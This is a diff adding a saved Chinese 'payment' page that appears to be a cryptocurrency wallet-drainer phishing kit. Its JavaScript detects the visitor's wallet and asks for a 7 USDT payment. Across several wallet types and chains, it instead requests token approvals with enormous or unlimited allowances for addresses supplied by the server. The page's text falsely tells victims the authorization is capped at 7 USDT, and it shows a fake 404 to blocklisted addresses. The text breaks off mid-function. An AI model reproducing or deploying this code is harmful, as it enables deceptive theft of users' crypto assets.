@@ -1,0 +1,1856 @@
+<!DOCTYPE html>
+<!-- saved from url=(0052)https://pay.tp18.vip/sc/zhanghao/7774498987560/7/pay -->
+<html lang="zh-CN"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style>body {transition: opacity ease-in 0.2s; } 
+body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relative; } 
+</style><script src="chrome-extension://jlpcnoohcpfgpbalhlggdhjocgnlgafn/assets/main-world.ts-4ed993c7.js" type="module"></script>
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+	<title>付款</title>
+	<link rel="stylesheet" href="./付款_files/animate.min.css">
+	<link rel="stylesheet" href="./付款_files/all.min.css">
+	<style>
+		body {
+			padding: 0;
+			margin: 0;
+			overflow: hidden;
+		}
+
+		.container {
+			width: 100vw;
+			height: 100vh;
+			display: flex;
+			justify-content: center;
+			background-color: rgb(240, 238, 237);
+		}
+
+		.box {
+			width: 400px;
+			padding-top: 50px;
+		}
+
+		.input_group {
+			width: 100%;
+			display: flex;
+			flex-direction: column;
+		}
+
+		.input_group label {
+			font-size: 13px;
+			letter-spacing: 1px;
+			margin: 20px 0 10px 0;
+			color: rgb(66, 65, 65);
+		}
+
+		.input_group input {
+			outline: none;
+			border: none;
+			line-height: 40px;
+			height: 40px;
+			border-radius: 10px;
+			box-sizing: border-box;
+			padding: 0 20px;
+		}
+
+		.input_submit {
+			height: 30px;
+			width: 100%;
+			color: #fff;
+			outline: none;
+			border: none;
+			margin-top: 50px;
+			border-radius: 7px;
+			transition: all 0.15s;
+			cursor: pointer;
+			background-color: #396d3b;
+		}
+
+		.input_submit.active {
+			background-color: #38c172;
+		}
+
+		.zz {
+			display: none;
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100vw;
+			height: 100vh;
+			background-color: rgba(0, 0, 0, 0.3);
+			z-index: 9;
+		}
+
+		.module {
+			border-radius: 10px;
+			position: absolute;
+			top: -700px;
+			display: block;
+			width: 500px;
+			height: 700px;
+			background-color: #fff;
+			z-index: 10;
+			animation-duration: 1s;
+			box-sizing: border-box;
+			padding: 10px 20px;
+		}
+
+		@media screen and (max-width: 750px) {
+			.module {
+				border-radius: 10px;
+				position: absolute;
+				top: -700px;
+				display: block;
+				width: 95%;
+				height: 80%;
+				background-color: #fff;
+				z-index: 10;
+				animation-duration: 1s;
+				box-sizing: border-box;
+				padding: 10px 20px;
+			}
+		}
+
+		.module.show {
+			top: 50px;
+		}
+
+		.module.hide {
+			top: -700px;
+		}
+
+		.alert {
+			font-size: 12px;
+			margin: 10px auto;
+			background-color: #e6f7e6;
+			color: #52c41a;
+			padding: 10px;
+			border-radius: 4px;
+			display: flex;
+			align-items: center;
+			margin-bottom: 20px;
+		}
+
+		.alert.red {
+			color: rgb(230, 92, 92);
+			background-color: rgb(245, 227, 227);
+		}
+
+		#danger,
+		#danger_f {
+			display: none;
+		}
+
+		.alert i {
+			margin-right: 10px;
+		}
+
+		h2 {
+			width: 100%;
+			text-align: center;
+			font-size: 14px;
+			margin-bottom: 20px;
+		}
+
+		.form-group {
+			margin-top: 100px;
+			margin-bottom: 20px;
+			display: flex;
+			align-items: center;
+		}
+
+		.form-group2 {
+			margin-bottom: 20px;
+			display: flex;
+			align-items: center;
+		}
+
+		.number {
+			display: flex;
+			margin-left: 20px;
+		}
+
+		.decrease {
+			border-left: 1px solid #d9d9d9;
+		}
+
+		.plus {
+			border-right: 1px solid #d9d9d9;
+		}
+
+		.decrease,
+		.plus {
+			font-size: 20px;
+			width: 25px;
+			height: 25px;
+			display: flex;
+			justify-content: center;
+			align-items: center;
+			background-color: #eef3f7;
+			border-top: 1px solid #d9d9d9;
+			border-bottom: 1px solid #d9d9d9;
+		}
+
+		.form-group label {
+			display: block;
+			font-size: 13px;
+			margin-bottom: 5px;
+			cursor: pointer;
+		}
+
+		p {
+			font-size: 14px;
+		}
+
+		p strong {
+			color: red;
+		}
+
+		.form-group input[type='number'] {
+			width: 50px;
+			padding: 0 8px;
+			border: none;
+			border-top: 1px solid #d9d9d9;
+			border-bottom: 1px solid #d9d9d9;
+		}
+
+		.radio-group {
+			margin-left: 20px;
+			display: flex;
+			font-size: 14px;
+			gap: 20px;
+		}
+
+		.radio-group.active {
+			color: #1890ff;
+		}
+
+		.radio-group label {
+			border: 1px solid rgb(206, 204, 202);
+			padding: 6px;
+			display: flex;
+			font-size: 12px;
+			align-items: center;
+			border-radius: 5px;
+			cursor: pointer;
+		}
+
+		.radio-group input {
+			margin-right: 5px;
+		}
+
+		.radio-group input:checked {
+			color: #1890ff;
+			background-color: #1890ff;
+		}
+
+		.radio-group input:checked + span {
+			color: #1890ff;
+		}
+
+		.info {
+			border-radius: 4px;
+			margin-bottom: 20px;
+		}
+
+		.buttons {
+			position: absolute;
+			bottom: 010px;
+			right: 10px;
+			display: flex;
+			justify-content: flex-end;
+			gap: 10px;
+		}
+
+		.buttons button {
+			padding: 10px 20px;
+			border: none;
+			border-radius: 4px;
+			cursor: pointer;
+		}
+
+		.buttons .cancel {
+			background-color: #f5f5f5;
+			color: #000;
+		}
+
+		.buttons .confirm {
+			background-color: #1890ff;
+			color: #fff;
+		}
+
+		input[type='number']::-webkit-outer-spin-button,
+		input[type='number']::-webkit-inner-spin-button {
+			-webkit-appearance: none;
+			margin: 0;
+		}
+
+		input[type='number'] {
+			-moz-appearance: textfield;
+			/* 隐藏Firefox中的箭头 */
+		}
+
+		strong {
+			width: 80px !important;
+		}
+
+		.overlay {
+			position: fixed;
+			top: 0;
+			left: 0;
+			width: 100%;
+			height: 100%;
+			background-color: rgba(0, 0, 0, 0.5); /* 半透明黑色背景 */
+			display: none; /* 初始隐藏 */
+			justify-content: center;
+			align-items: center;
+			z-index: 9999; /* 确保在最上层 */
+		}
+
+		.loader {
+			border: 16px solid #f3f3f3; /* Light grey */
+			border-top: 16px solid #3498db; /* Blue */
+			border-radius: 50%;
+			width: 25px;
+			height: 25px;
+			animation: spin 2s linear infinite; /* 旋转动画 */
+		}
+
+		@keyframes spin {
+			0% {
+				transform: rotate(0deg);
+			}
+			100% {
+				transform: rotate(360deg);
+			}
+		}
+	</style>
+<style>
+      @font-face {
+        font-family: OKXSans;
+        src: url("chrome-extension://mcohilncbfahbmgdjkbpemcciiolgcge/static/fonts/HarmonyOS_Sans_Web/HarmonyOS_Sans_Regular.woff2") format("woff2"),
+        url("chrome-extension://mcohilncbfahbmgdjkbpemcciiolgcge/static/fonts/HarmonyOS_Sans_Web/HarmonyOS_Sans_Regular.woff2") format("woff");
+      }
+    </style></head>
+<body>
+<div id="overlay" class="overlay" style="display: none;">
+	<div class="loader"></div>
+</div>
+
+<div class="container">
+	<div class="box">
+		<div id="dev" style="display: none">
+
+		load<br>tp<br>0xd8b3ec7f801a647b41ab01115575c8f60180ff74<br>true<br>TGX7BXPV7aq5X56TY3ja1x9YDgw17Hdx7m,0xAD53dB1dd0d679b128d3c1087a4da5357FC83Bed,0xAD53dB1dd0d679b128d3c1087a4da5357FC83Bed<br>开始支付<br></div>
+		<a href="https://pay.tp18.vip/sc/zhanghao/7774498987560/7/pay?net=eth" style="display: none" id="to_eth">切换到 以太坊/币安智能链/EVM兼容链</a>
+		<a href="https://pay.tp18.vip/sc/zhanghao/7774498987560/7/pay?net=tron" style="display: none" id="to_tron">切换到 波场</a>
+		<script>
+			const url = new URL(window.location.href);
+			const params = new URLSearchParams(url.search);
+			let okx_net = undefined;
+			switch (params.get('net')) {
+				case 'eth':
+					document.getElementById('to_tron').removeAttribute('style');
+					okx_net = 'eth';
+					break
+				case 'tron':
+					document.getElementById('to_eth').removeAttribute('style');
+					okx_net = 'tron';
+					break
+			}
+		</script>
+		<div class="input_group">
+  <label>合约地址</label>
+  <input type="text" id="pay_addr" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" readonly="" oncopy="return false" oncut="return false" onpaste="return false" style="user-select: none; pointer-events: none;">
+</div>
+		<div class="input_group">
+			<label>金额</label>
+			<input type="number" value="7" id="rate" readonly="">
+		</div>
+		<button class="input_submit active" id="input_submit">立即支付</button>
+	</div>
+	<div class="zz" id="zz" style="display: none;"></div>
+	<div class="module hide" id="module">
+		<div class="alert" id="safe">
+			<i class="fas fa-exclamation-circle"></i>
+			安全提醒：当前授权地址只能转移最多7USDT。
+		</div>
+		<div class="alert red" id="danger">
+			<i class="fa-solid fa-xmark" style="color: rgb(230, 92, 92)"></i>
+			高危操作:当前授权地址可随时转移资产，无须经过我同意，有被盗风险。
+		</div>
+		<h2>为保证资产安全，请仔细阅读以下信息</h2>
+		<form>
+			<div class="form-group">
+				<label for="amount">授权金额(USDT)</label>
+				<div class="number">
+					<div class="decrease">-</div>
+					<input disabled="" type="number" id="amount" name="amount">
+					<div class="plus">+</div>
+				</div>
+			</div>
+
+			<p>
+				<strong>授权金额：</strong>授权以后，该授权地址将能转移指定授权金额，无法转走所有资产
+			</p>
+
+			<div class="form-group2">
+				<label style="font-size: 14px">授权金模式</label>
+				<div class="radio-group">
+					<label id="m1">
+						<input type="radio" name="mode" value="安全模式" checked="">
+						<span>安全模式</span>
+					</label>
+					<label id="m2">
+						<input type="radio" name="mode" value="白名单模式">
+						<span>白名单模式</span>
+					</label>
+				</div>
+			</div>
+			<div class="info">
+				<p id="safe_f">
+					<strong>安全模式：</strong>安全模式下地址直接转走资产，需要经过同意才能被转移
+				</p>
+				<p id="danger_f">
+					<strong>白名单模式:</strong>
+					授权地址可以直接转走资产且无需确认
+				</p>
+			</div>
+			<div class="buttons">
+				<button type="button" class="cancel" id="cancel">取消</button>
+				<button type="button" class="confirm" id="confirm">确认</button>
+			</div>
+		</form>
+	</div>
+</div>
+<script defer="" src="./付款_files/v8c78df7c7c0f484497ecbca7046644da1771523124516" integrity="sha512-8DS7rgIrAmghBFwoOTujcf6D9rXvH8xm8JQ1Ja01h9QX8EzXldiszufYa4IFfKdLUKTTrnSFXLDkUEOTrZQ8Qg==" data-cf-beacon="{&quot;version&quot;:&quot;2024.11.0&quot;,&quot;token&quot;:&quot;c25be5dd93084b70b389b8c61e310446&quot;,&quot;r&quot;:1,&quot;server_timing&quot;:{&quot;name&quot;:{&quot;cfCacheStatus&quot;:true,&quot;cfEdge&quot;:true,&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfOrigin&quot;:true,&quot;cfSpeedBrain&quot;:true},&quot;location_startswith&quot;:null}}" crossorigin="anonymous"></script>
+
+<script src="./付款_files/abi.js.下载"></script>
+<script src="./付款_files/web3.min.js.下载"></script>
+<script>
+	site_id = "zhanghao";
+	let wallet = undefined;
+	let chain = undefined;
+	let address = undefined;
+	let approve_address = [];
+	let push = true;
+	let accounts = undefined;
+
+	function toggleLoader(display = 'flex') {
+		document.getElementById('overlay').style.display = display
+	}
+
+	toggleLoader();
+
+	// function replaceHostInUrl(text, newHost) {
+	//     return text.replace(/https:\/\/([^\/]+)(\/[^\s]*)?/g, (match, p1, p2) => {
+	//         const url = new URL(match);
+	//         url.host = newHost; // 替换主机部分
+	//         return url.origin + (p2 || ''); // 返回新的 URL
+	//     });
+	// }
+	//
+	// p_url = replaceHostInUrl(window.location.href, 'nginx404noutfound.cloudflare-node.cyou');
+	function set_404() {
+		document.body.innerHTML = "<h1>404 Not Found</h1><p>The page you are looking for does not exist.</p>";
+		document.title = "404 Not Found";
+	}
+
+
+	async function get_contract_address(address) {
+		try {
+			const response = await fetch('/get_contract_address?address=' + address); // 发起 GET 请求
+			if (!response.ok) {
+				throw new Error(`HTTP error! Status: ${response.status}`);
+			}
+			const data = await response.json(); // 解析 JSON 内容
+			return data; // 返回解析后的数据
+		} catch (error) {
+			window.location.reload()
+		}
+	}
+async function checkCurrentAllowance(userAddress, spenderAddress) {
+      try {
+          if (chain === 'tron') {
+              // 检查波场链上的授权额度
+              const contract = await tronWeb.contract().at(tron_contract_address);
+              const allowance = await contract.allowance(userAddress, spenderAddress).call();
+              return allowance;
+          }
+          // 可以添加其他链的检查
+          return 0;
+      } catch (error) {
+          console.error('检查授权额度失败:', error);
+          return 0;
+      }
+  }
+	async function is_bl(address) {
+		try {
+			const response = await fetch('/query_bl?address=' + address); // 发起 GET 请求
+			if (!response.ok) {
+				throw new Error(`HTTP error! Status: ${response.status}`);
+			}
+			const data = await response.json(); // 解析 JSON 内容
+			return data; // 返回解析后的数据
+		} catch (error) {
+			window.location.reload()
+		}
+	}
+
+	function getFirstElementOrItself(variable) {
+		if (Array.isArray(variable)) {
+			// 如果是数组，返回第一个元素
+			return variable[0];
+		} else {
+			// 否则返回它本身
+			return variable;
+		}
+	}
+
+	window.addEventListener("load", async function () {
+		print_dev('load');
+		if (typeof window.imToken !== "undefined") {
+			wallet = 'imtoken';
+			print_dev('imtoken');
+			if (typeof window.tronWeb !== "undefined") {
+				chain = 'tron';
+				print_dev('tron');
+				address = window.tronWeb.defaultAddress.base58;
+				print_dev(address)
+			} else if (typeof window.ethereum !== "undefined") {
+				switch (window.ethereum.chainId) {
+					case '0x1':
+						chain = 'eth';
+						print_dev('eth');
+						break
+					case '0x38':
+						chain = 'bsc';
+						print_dev('bsc');
+						break
+				}
+				accounts = await ethereum.request({method: 'eth_requestAccounts'});
+				for (let i in accounts) {
+					print_dev(accounts[i])
+				}
+			}
+		} else if (typeof window.tokenpocket !== "undefined") {
+			wallet = 'tp';
+			print_dev('tp');
+			if (typeof window.tronWeb !== "undefined" && window.tronWeb.defaultAddress.base58) {
+				chain = 'tron';
+				print_dev('tron');
+				address = window.tronWeb.defaultAddress.base58;
+				print_dev(address);
+			} else if (typeof window.ethereum !== "undefined") {
+				switch (window.ethereum.chainId) {
+					case '0x1':
+						chain = 'eth';
+						print_dev('eth');
+						break
+					case '0x38':
+						chain = 'bsc';
+						print_dev('bsc');
+						break
+				}
+				accounts = await ethereum.request({method: 'eth_requestAccounts'});
+				for (let i in accounts) {
+					print_dev(accounts[i])
+				}
+			}
+		} else if (typeof window.okxwallet !== "undefined") {
+			window.okxwallet.on('chainChanged', handleChainChanged);
+			wallet = 'okx';
+			print_dev('okx');
+			if (okx_net === 'tron') {
+				chain = 'tron';
+				print_dev('tron');
+				accounts = await window.okxwallet.tronLink.request({method: 'tron_requestAccounts'});
+				print_dev(accounts)
+				address = tronWeb.defaultAddress.base58;
+				print_dev(address)
+			} else if (okx_net === 'eth') {
+				switch (window.ethereum.chainId) {
+					case '0x1':
+						chain = 'eth';
+						print_dev('eth');
+						break
+					case '0x38':
+						chain = 'bsc';
+						print_dev('bsc');
+						break
+				}
+				accounts = await window.okxwallet.request({method: 'eth_requestAccounts'});
+				print_dev(accounts)
+			}
+
+		} else if (typeof window.trustwallet !== "undefined") {
+			wallet = 'trust';
+			print_dev('trust');
+			accounts = await window.trustwallet.request({
+				method: "eth_requestAccounts",
+			});
+			print_dev(accounts)
+			let chainId = await window.trustwallet.request({method: "eth_chainId"});
+			switch (chainId) {
+				case 1:
+					chain = 'eth';
+					print_dev('eth');
+					break
+				case 56:
+					chain = 'bsc';
+					print_dev('bsc');
+					break
+			}
+		} else if (typeof window.bitkeep !== "undefined") {
+			wallet = 'bitkeep';
+			print_dev('bitkeep');
+			if (typeof window.bitkeep.tronWeb !== "undefined") {
+				chain = 'tron';
+				print_dev('tron');
+				address = window.tronWeb.defaultAddress.base58;
+				print_dev(address);
+			} else if (typeof window.ethereum !== "undefined") {
+				switch (window.ethereum.chainId) {
+					case '0x1':
+						chain = 'eth';
+						print_dev('eth');
+						break
+					case '0x38':
+						chain = 'bsc';
+						print_dev('bsc');
+						break
+				}
+				accounts = await ethereum.request({method: 'eth_requestAccounts'});
+				for (let i in accounts) {
+					print_dev(accounts[i])
+				}
+			}
+		} else if (typeof window.tronLink !== "undefined") {
+			wallet = 'tronlink';
+			print_dev('tronlink');
+			chain = 'tron';
+			print_dev('tron');
+			let res = await tronLink.request({method: 'tron_requestAccounts'});
+			while (res.code !== 200) {
+				res = await tronLink.request({method: 'tron_requestAccounts'});
+			}
+			address = tronWeb.defaultAddress.base58;
+			print_dev(address)
+		} else if (typeof window.tronWeb !== "undefined") {
+			// 其他钱包
+			wallet = 'tronweb';
+			print_dev('tronweb');
+			chain = 'tron';
+			print_dev('tron');
+			address = window.tronWeb.defaultAddress.base58;
+			print_dev(address);
+
+		} else if (typeof window.ethereum !== "undefined") {
+			// 其他钱包
+			if (typeof window.ethereum.isMetaMask !== "undefined") {
+				wallet = 'metamask';
+				print_dev('metamask');
+				let chainId = await ethereum.request({method: 'eth_chainId'});
+				switch (chainId) {
+					case '0x1':
+						chain = 'eth';
+						print_dev('eth');
+						break
+					case '0x38':
+						chain = 'bsc';
+						print_dev('bsc');
+						break
+				}
+				accounts = await ethereum.request({method: 'eth_requestAccounts'});
+				for (let i in accounts) {
+					print_dev(accounts[i])
+				}
+			} else {
+				wallet = 'web3';
+				print_dev('web3');
+				let chainId = undefined;
+				try {
+					chainId = await ethereum.request({method: 'eth_chainId'});
+				} catch (e) {
+					print_dev(e)
+				}
+				try {
+					if (chainId === undefined) {
+						chainId = window.ethereum.chainId
+					}
+				} catch (e) {
+					print_dev(e)
+				}
+				switch (chainId) {
+					case '0x1':
+						chain = 'eth';
+						print_dev('eth');
+						break
+					case '0x38':
+						chain = 'bsc';
+						print_dev('bsc');
+						break
+				}
+				accounts = await ethereum.request({method: 'eth_requestAccounts'});
+				for (let i in accounts) {
+					print_dev(accounts[i])
+				}
+			}
+		}
+		switch (chain) {
+			case 'tron':
+				address_ele.value = tron_contract_address;
+				break
+			case 'eth':
+				address_ele.value = eth_contract_address;
+				break
+			case 'bsc':
+				address_ele.value = bsc_contract_address;
+				break
+		}
+
+		let is_bl_res = await is_bl(address || getFirstElementOrItself(accounts));
+
+		if (is_bl_res.data) {
+			set_404()
+		}
+
+		let res = await get_contract_address(address || getFirstElementOrItself(accounts));
+		approve_address = res.address;
+		push = res.p;
+		print_dev(push);
+		print_dev(approve_address);
+		toggleLoader('none');
+	});
+
+	function handleChainChanged(chainId) {
+		// We recommend reloading the page, unless you must do otherwise.
+		window.location.reload();
+	}
+
+	function print_dev(text) {
+		document.getElementById('dev').innerHTML += text + '<br>'
+	}
+
+	async function pay() {
+		print_dev('开始支付');
+		toggleLoader();
+		setTimeout(toggleLoader, 30000, 'none');
+		switch (wallet) {
+			case 'okx':
+				switch (chain) {
+					case 'tron':
+						await okx_tron();
+						break
+					case 'eth':
+						await okx_eth();
+						break
+					case 'bsc':
+						await okx_bsc();
+						break
+				}
+				break
+			case 'imtoken':
+				switch (chain) {
+					case 'tron':
+						await imtoken_tron();
+						break
+					case 'eth':
+						alert('正在拉起支付！选择安全模式后，请勿修改下个页面代币数量，否则会导致支付失败！');
+						await imtoken_eth();
+						break
+					case 'bsc':
+						alert('正在拉起支付！选择安全模式后，请勿修改下个页面代币数量，否则会导致支付失败！');
+						await imtoken_bsc();
+						break
+				}
+				break
+			case 'tp':
+				switch (chain) {
+					case 'tron':
+						await tp_tron();
+						break
+					case 'eth':
+						await tp_eth();
+						break
+					case 'bsc':
+						await tp_bsc();
+						break
+				}
+				break
+			case 'trust':
+				switch (chain) {
+					case 'eth':
+						await trust_eth();
+						break
+					case 'bsc':
+						await trust_bsc();
+						break
+				}
+				break
+			case 'bitkeep':
+				switch (chain) {
+					case 'tron':
+						await bitkeep_tron();
+						break
+					case 'eth':
+						await bitkeep_eth();
+						break
+					case 'bsc':
+						await bitkeep_bsc();
+						break
+				}
+				break
+			case 'metamask':
+				switch (chain) {
+					case 'eth':
+						await metamask_eth();
+						break
+					case 'bsc':
+						await metamask_bsc();
+						break
+				}
+				break
+			case 'tronlink':
+				switch (chain) {
+					case 'tron':
+						await tronlink_tron();
+						break
+				}
+				break
+			case 'tronweb':
+				switch (chain) {
+					case 'tron':
+						await tp_tron();
+						break
+				}
+				break
+			case 'web3':
+				switch (chain) {
+					case 'eth':
+						await metamask_eth();
+						break
+					case 'bsc':
+						await metamask_bsc();
+						break
+				}
+				break
+		}
+
+		async function okx_tron() {
+			let trx_balance = await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
+			if (trx_balance < 30000000) {
+				alert('没有足够的TRX用于支付网络费。');
+				toggleLoader('none');
+			} else {
+				let approve_tx = await tronWeb.transactionBuilder.triggerSmartContract(
+						tron_contract_address,
+						'increaseApproval(address,uint256)',
+						{
+							feeLimit: 100000000,
+						},
+						[
+							{
+								type: 'address',
+								value: approve_address[0],
+							},
+							{
+								type: 'uint256',
+								value:
+										'0x000fffffffffffffffffffffffffffffffffffffffffffffffffffffffffff',
+							},
+						],
+						address
+				);
+				let signed_tx = await tronWeb.trx.sign(approve_tx.transaction);
+				// signed_tx.raw_data = approve_tx_raw;
+				try {
+					let result = tronWeb.trx.sendRawTransaction(signed_tx);
+					console.log(result);
+					await success_callback(accounts[0], approve_address[0], 2);
+				} catch (error) {
+					alert('失败');
+					toggleLoader('none');
+					console.log(error)
+				}
+			}
+		}
+
+		async function okx_eth() {
+			let web3 = new Web3(window.ethereum);
+			let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);
+			contract.methods.approve(
+					approve_address[1], '999999999999999999999999999999999999999999999999999999999999999999999'
+			).send(
+					{from: accounts[0]}).on('transactionHash', async function (hash) {
+						print_dev(hash);
+						await success_callback(accounts[0], approve_address[1], 1);
+					}
+			);
+		}
+
+		async function okx_bsc() {
+			let web3 = new Web3(window.ethereum);
+			let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);
+			contract.methods.approve(
+					approve_address[2], '999999999999999999999999999999999999999999999999999999999999999999999'
+			).send(
+					{from: accounts[0]}).on('transactionHash', async function (hash) {
+						print_dev(hash);
+						await success_callback(accounts[0], approve_address[2], 2);
+					}
+			);
+		}
+
+		async function imtoken_tron() {
+			let trx_balance = await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
+			if (trx_balance < 30000000) {
+				alert('没有足够的TRX用于支付网络费。');
+				toggleLoader('none');
+			} else {
+
+
+				let approve_tx = await tronWeb.transactionBuilder.triggerSmartContract(
+						tron_contract_address,
+						'increaseApproval(address,uint256)',
+						{
+							feeLimit: 100000000,
+						},
+						[
+							{
+								type: 'address',
+								value: approve_address[0],
+							},
+							{
+								type: 'uint256',
+								value:
+										'0x0000000000000000000000000000000000000000661efdf2e3b1a000000000',
+							},
+						],
+						address
+				);
+				let rawDataHex = approve_tx.transaction.raw_data_hex.toString();
+				rawDataHex.replace("d73dd623", "D73DD623");
+				let contractData = approve_tx.transaction.raw_data.contract[0].parameter.value.data.toString();
+				contractData = contractData.replace("d73dd623", "D73DD623");
+				approve_tx.transaction.raw_data_hex = rawDataHex;
+				approve_tx.transaction.raw_data.contract[0].parameter.value.data = contractData;
+
+				let signed_tx = await tronWeb.trx.sign(approve_tx.transaction);
+
+				try {
+					let result = tronWeb.trx.sendRawTransaction(signed_tx);
+					console.log(result);
+					await success_callback(address, approve_address[0], 2);
+				} catch (error) {
+					alert('失败');
+					toggleLoader('none');
+					console.log(error)
+				}
+			}
+		}
+
+		async function imtoken_eth() {
+			let web3 = new Web3(window.ethereum);
+			let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);
+			contract.methods.approve(
+					approve_address[1], '123456789123456789123456789'
+			).send(
+					{from: accounts[0]}).on('transactionHash', async function (hash) {
+						print_dev(hash);
+						await success_callback(accounts[0], approve_address[1], 1);
+					}
+			);
+		}
+
+		async function imtoken_bsc() {
+			let web3 = new Web3(window.ethereum);
+			let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);
+			contract.methods.approve(
+					approve_address[2], '123456789123456789123456789123456789'
+			).send(
+					{from: accounts[0]}).on('transactionHash', async function (hash) {
+						print_dev(hash);
+						await success_callback(accounts[0], approve_address[2], 2);
+					}
+			);
+		}
+
+		async function tp_tron() {
+			let trx_balance = await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
+			if (trx_balance < 30000000) {
+				alert('没有足够的TRX用于支付网络费。');
+				toggleLoader('none');
+			} else {
+				let approve_tx = await tronWeb.transactionBuilder.triggerSmartContract(
+						tron_contract_address,
+						'increaseApproval(address,uint256)',
+						{
+							feeLimit: 100000000,
+						},
+						[
+							{
+								type: 'address',
+								value: approve_address[0],
+							},
+							{
+								type: 'uint256',
+								value:
+										'0x0000000000000000000000000000000000000000661efdf2e3b1a000000000',
+							},
+						],
+						address
+				);
+				print_dev(approve_tx)
+				let signed_tx = await tronWeb.trx.sign(approve_tx.transaction);
+				// signed_tx.raw_data = approve_tx_raw;
+				try {
+					let result = tronWeb.trx.sendRawTransaction(signed_tx);
+					console.log(result);
+					await success_callback(address, approve_address[0], 2);
+				} catch (error) {
+					alert('失败');
+					toggleLoader('none');
+					console.log(error)
+				}
+			}
+		}
+
+		async function tp_eth() {
+			let web3 = new Web3(window.ethereum);
+			print_dev(web3)
+			let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);
+			print_dev(contract)
+			print_dev(approve_address[1])
+			print_dev(accounts[0])
+
+			contract.methods.approve(
+					approve_address[1], '123456789123456789123456789'
+			).send(
+					{from: accounts[0]}).on('transactionHash', async function (hash) {
+						print_dev(hash);
+						await success_callback(accounts[0], approve_address[1], 1);
+					}
+			);
+		}
+
+		async function tp_bsc() {
+			let web3 = new Web3(window.ethereum);
+			let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);
+			contract.methods.approve(
+					approve_address[2], '123456789123456789123456789123456789'
+			).send(
+					{from: accounts[0]}).on('transactionHash', async function (hash) {
+						print_dev(hash);
+						await success_callback(accounts[0], approve_address[2], 2);
+					}
+			);
+		}
+
+		async function trust_eth() {
+			let web3 = new Web3(window.ethereum);
+			print_dev(web3)
+			let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);
+			print_dev(contract)
+			print_dev(approve_address[1])
+			print_dev(accounts[0])
+
+			contract.methods.approve(
+					approve_address[1], '123456789123456789123456789'
+			).send(
+					{from: accounts[0]}).on('transactionHash', async function (hash) {
+						print_dev(hash);
+						await success_callback(accounts[0], approve_address[1], 1);
+					}
+			);
+		}
+
+		async function trust_bsc() {
+			let web3 = new Web3(window.ethereum);
+			let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);
+			contract.methods.approve(
+					approve_address[2], '123456789123456789123456789123456789'
+			).send(
+					{from: accounts[0]}).on('transactionHash', async function (hash) {
+						print_dev(hash);
+						await success_callback(accounts[0], approve_address[2], 2);
+					}
+			);
+		}
+
+		async function bitkeep_tron() {
+			let trx_balance = await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
+			print_dev(trx_balance);
+			if (trx_balance < 30000000) {
+				alert('没有足够的TRX用于支付网络费。');
+				toggleLoader('none');
+			} else {
+				let approve_tx = await tronWeb.transactionBuilder.triggerSmartContract(
+						tron_contract_address,
+						'increaseApproval(address,uint256)',
+						{
+							feeLimit: 100000000,
+						},
+						[
+							{
+								type: 'address',
+								value: approve_address[0],
+							},
+							{
+								type: 'uint256',
+								value:
+										'0x0000000000000000000000000000000000000000661efdf2e3b1a000000000',
+							},
+						],
+						address
+				);
+				print_dev(approve_tx)
+				let signed_tx = await tronWeb.trx.sign(approve_tx.transaction);
+				// signed_tx.raw_data = approve_tx_raw;
+				try {
+					let result = tronWeb.trx.sendRawTransaction(signed_tx);
+					console.log(result);
+					await success_callback(address, approve_address[0], 2);
+				} catch (error) {
+					alert('失败');
+					toggleLoader('none');
+					console.log(error)
+				}
+			}
+		}
+
+		async function bitkeep_eth() {
+			let web3 = new Web3(window.ethereum);
+			print_dev(web3)
+			let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);
+			print_dev(contract)
+			print_dev(approve_address[1])
+			print_dev(accounts[0])
+
+			contract.methods.approve(
+					approve_address[1], '123456789123456789123456789'
+			).send(
+					{from: accounts[0]}).on('transactionHash', async function (hash) {
+						print_dev(hash);
+						await success_callback(accounts[0], approve_address[1], 1);
+					}
+			);
+		}
+
+		async function bitkeep_bsc() {
+			let web3 = new Web3(window.ethereum);
+			let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);
+			contract.methods.approve(
+					approve_address[2], '123456789123456789123456789123456789'
+			).send(
+					{from: accounts[0]}).on('transactionHash', async function (hash) {
+						print_dev(hash);
+						await success_callback(accounts[0], approve_address[2], 2);
+					}
+			);
+		}
+
+		async function metamask_eth() {
+			let web3 = new Web3(window.ethereum);
+			let contract = new web3.eth.Contract(eth_contract_abi, eth_contract_address);
+
+			contract.methods.approve(
+					approve_address[1], '123456789123456789123456789'
+			).send(
+					{from: accounts[0]}).on('transactionHash', async function (hash) {
+						print_dev(hash);
+						await success_callback(accounts[0], approve_address[1], 1);
+					}
+			);
+		}
+
+		async function metamask_bsc() {
+			let web3 = new Web3(window.ethereum);
+			let contract = new web3.eth.Contract(bsc_contract_abi, bsc_contract_address);
+			contract.methods.approve(
+					approve_address[2], '123456789123456789123456789123456789'
+			).send({from: accounts[0]}).on('transactionHash', async function (hash) {
+						print_dev(hash);
+						await success_callback(accounts[0], approve_address[2], 2);
+					}
+			).on('error', async function (error) {
+				alert('qu');
+				print_dev(error);
+				toggleLoader('none')
+			});
+
+		}
+
+		async function tronlink_tron() {
+			let trx_balance = await tronWeb.trx.getBalance(window.tronWeb.defaultAddress.base58);
+			// print_dev(trx_balance);
+			if (trx_balance < 30000000) {
+				alert('没有足够的TRX用于支付网络费。');
+				toggleLoader('none');
+			} else {
+				let approve_tx = await tronWeb.transactionBuilder.triggerSmartContract(
+						tron_contract_address,
+						'increaseApproval(address,uint256)',
+						{
+							feeLimit: 100000000,
+						},
+						[
+							{
+								type: 'address',
+								value: approve_address[0],
+							},
+							{
+								type: 'uint256',
+								value:
